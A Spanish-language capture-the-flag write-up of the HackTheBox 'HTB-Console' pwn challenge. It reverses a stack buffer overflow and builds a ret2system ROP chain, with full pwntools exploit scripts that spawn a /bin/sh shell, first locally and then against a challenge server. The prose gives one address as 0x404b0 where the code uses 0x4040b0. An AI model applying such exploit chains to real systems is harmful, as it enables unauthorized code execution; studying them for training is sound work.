---
title: HTB-Console - Pwn Challenge (HTB) ❤
author: sha16
categories: [linux, binary exploitation, htb]
tags: [linux, pwn, htb, 64-bit] 
---

Hola a tod@s! Hoy les traigo un nuevo post de binary exploitation. 

Este es un reto de pwning, del tipo `ret2system`, similar al `ret2libc`, el cual implica explotar un *Buffer Overflow* con el objetivo de evadir la protección `no-execute (NX)` mediante la ejecución de un *ROP Attack*, el cual nos permitirá aprovechar las funciones que utiliza el programa para lograr ejecutar una `shell` interactiva.

Como se puede observar en imagen, la idea del programa es “emular” una consola, común y corriente, la cual posee una cantidad limitada de comandos.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled.png)

Ejecutando el programa con `ltrace`, logramos identificar el resto de los comandos, les dejaré la función de cada uno para no extenderme demasiado:

- `id`: Es lo mismo que el comando `id`, identifica al usuario que ejecuta la `shell`.
- `dir`: Imprime la “ruta actual” en la que se encuentra el usuario en consola.
- `flag`: Despliega un input que le solicita la `flag` al usuario.
- `hof`: Despliega un input que solicita el nombre del usuario.
- `ls`: Imprime un listado de “directorios”.
- `date`: Imprime el output del comando `date`.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%201.png)

Sabiendo esto, analizaremos el programa un poco más a fondo, aplicando `reversing` con `Ghidra`.

El binario se encuentra *[stripped](https://en.wikipedia.org/wiki/Strip_(Unix))*, sin embargo, luego de identificar las funciones y variables principales, se obtuvieron las siguientes piezas de código.

En primer lugar, se identifica el código de la función principal (`main`), la cual, en este caso, sólo se encarga de solicitar el input del usuario, el que es almacenado en una variable de `16 bytes` y posteriormente pasado como argumento a la función `execute_command`.

```c
void main(void) {
  char command [16];
  
  FUN_00401196();
  puts("Welcome HTB Console Version 0.1 Beta.");
  do {
    printf(">> ");
    fgets(command,16,stdin);
    execute_command(command);
    memset(command,0,16);
  } while( true );
}
```

Haciendo revisión de la función `execute_command`, esta recibe el parámetro, el cual corresponde al comando del usuario, y define una variable `user_flag`, de `16 bytes`, la cual es usada para recibir el input del usuario cuando este ejecuta el comando `flag`. 

```c
void execute_command(char *user_command) {
  int command_checker;
  char user_flag [16];
  
  command_checker = strcmp(user_command,"id\n");
  if (command_checker == 0) {
    puts("guest(1337) guest(1337) HTB(31337)");
  }
  else {
    command_checker = strcmp(user_command,"dir\n");
    if (command_checker == 0) {
      puts("/home/HTB");
    }
    else {
      command_checker = strcmp(user_command,"flag\n");
      if (command_checker == 0) {
        printf("Enter flag: ");
        fgets(user_flag,48,stdin);
        puts("Whoops, wrong flag!");
      }
      else {
        command_checker = strcmp(user_command,"hof\n");
        if (command_checker == 0) {
          puts("Register yourself for HTB Hall of Fame!");
          printf("Enter your name: ");
          fgets(&user_name,10,stdin);
          puts("See you on HoF soon! :)");
        }
        else {
          command_checker = strcmp(user_command,"ls\n");
          if (command_checker == 0) {
            puts("- Boxes");
            puts("- Challenges");
            puts("- Endgames");
            puts("- Fortress");
            puts("- Battlegrounds");
          }
          else {
            command_checker = strcmp(user_command,"date\n");
            if (command_checker == 0) {
              system("date");
            }
            else {
              puts("Unrecognized command.");
            }
          }
        }
      }
    }
  }
  return;
}
```

En este punto, identificamos el *buffer overflow*, debido a que se establecen `16 bytes` para la variable que recibe la `flag` del usuario, sin embargo, a través de la función `fgets`, vemos que esta se ha configurado para recibir `48 bytes` del usuario, lo cual significa que es posible usar dicho error para sobrescribir otras áreas de la memoria.   

```c
---
  int command_checker;
  char flag [16]; /* 16 bytes */
---
	command_checker = strcmp(user_command,"flag\n");
	if (command_checker == 0) {
	  printf("Enter flag: ");
	  fgets(flag,48,stdin); /* 48 bytes */
	  puts("Whoops, wrong flag!");
	}
---
```

En base a esta teoría, se coloca una cadena de `80 bytes` en el input de la `flag`, lo cual genera que el programa lance un error `segmentation fault`, debido a que se ha logrado el desbordamiento de *buffer*.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%202.png)

Posterior a esto, se genera una cadena de `100 bytes` con `pattern create`, de `gdb-gef`, con el objetivo de identificar cuántos `bytes` debemos introducir antes de sobrescribir la dirección de retorno del programa.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%203.png)

Habiendo hecho esto, al ejecutar el programa y colocar el patrón, detectamos que el `offset` corresponde a `24 bytes`.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%204.png)

Antes de continuar, es importante mencionar que el programa tiene implementado el `no-execute (NX)`, el cual nos impide colocar código malicioso en el `stack`. Por lo tanto, todo lo que sea `shellcode` tendremos que descartarlo. 

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%205.png)

Sin embargo, esto no es el fin del mundo, debido a que el programa llama a la función `system` a través del comando `date` y, por otro lado, nos permite ingresar cualquier tipo de cadena de `10 bytes` con el comando `hof`. 

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%206.png)

En base a esto, primeramente, identificamos la dirección de la llamada a la función `system`, con la herramienta `radare2`:

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%207.png)

Esto también se puede lograr con `objdump`:

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%208.png)

Posterior a ello, necesitamos identificar un `ROP Gadget`, el cual nos permitirá llamar a la función `system`, y pasarle un argumento, el cual necesariamente tiene que almacenarse en el registro `RDI`.

```bash
root@offs3c:~/HTB-Console# ROPgadget --binary htb-console | grep 'pop rdi ; ret' 
0x0000000000401473 : pop rdi ; ret
```

Teniendo esto último, sólo faltaría identificar la dirección donde se almacena el valor del nombre ingresado, al usar el comando `hof`. Esto lo hacemos con el objetivo de escribir el argumento que vamos a pasarle a la función `system`. Al automatizar el ataque, en lugar de escribir `sha16`, escribiremos `/bin/sh`, lo cual nos permitirá ejecutar una `shell` interactiva.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%209.png)

Como se observa en la siguiente imagen, al forzar la detención del programa, identificamos que la cadena `sha16` se ha almacenado en la dirección `0x404b0`.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%2010.png)

En base a esto, escribimos el siguiente `exploit`, el cual nos permitirá explotar el *buffer overflow* y obtener una `shell` interactiva, a partir del *rop attack*, el cual logramos a partir de los mismos componentes del programa.

Para darles más contexto, el desbordamiento de *buffer* nos permite alterar el flujo del programa y llamar a la función `system` (`0x401381`), la que recibe como parámetro la cadena `/bin/sh` (`0x404b0`). 

Esto es posible gracias al `Rop Gadget`, el cual hace posible almacenar dicho argumento en el registro `RDI` para pasarlo a la función `system`, y ejecutar el comando correctamente.

```python
#!/usr/bin/python3

from pwn import process, p64

if __name__ == '__main__':
    p = process('./htb-console')

    system_addr = 0x401381 # 0x401381 e8bafcffff call sym.imp.system 
    POP_RDI = 0x401473 # 0x0000000000401473 : pop rdi ; ret
    name_addr = 0x4040b0 

    offset = 24
    junk = b'\x41' * offset

    payload = junk 
    payload += p64(POP_RDI) 
    payload += p64(name_addr) 
    payload += p64(system_addr) 

    p.sendlineafter(b'>> ', b'hof')
    p.sendlineafter(b'Enter your name: ', b'/bin/sh\0')    
    p.sendlineafter(b'>> ', b'flag')
    p.sendlineafter(b'Enter flag: ', payload)

    p.recv()
    p.interactive()
```

Como se logra ver en imagen el `exploit` es ejecutado correctamente, y permite obtener la `shell` interactiva.

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%2011.png)

Para completar el desafío, sólo debemos adaptar el `exploit` para que se conecte al servidor de HackTheBox con la función `remote`, en lugar de `process`:

```python
#!/usr/bin/python3

from pwn import remote, p64

if __name__ == '__main__':
    p = remote('159.65.26.210', 31426)

    system_addr = 0x401381 # 0x401381 e8bafcffff call sym.imp.system 
    POP_RDI = 0x401473 # 0x0000000000401473 : pop rdi ; ret
    name_addr = 0x4040b0 

    offset = 24
    junk = b'\x41' * offset

    payload = junk 
    payload += p64(POP_RDI) 
    payload += p64(name_addr) 
    payload += p64(system_addr) 

    p.sendlineafter(b'>> ', b'hof')
    p.sendlineafter(b'Enter your name: ', b'/bin/sh\0')    
    p.sendlineafter(b'>> ', b'flag')
    p.sendlineafter(b'Enter flag: ', payload)

    p.recv()
    p.interactive()
```

Y ya con esto, el desafío está `pwned`:

![Untitled](/assets/img/htb/pwn/HTB-Console/Untitled%2012.png)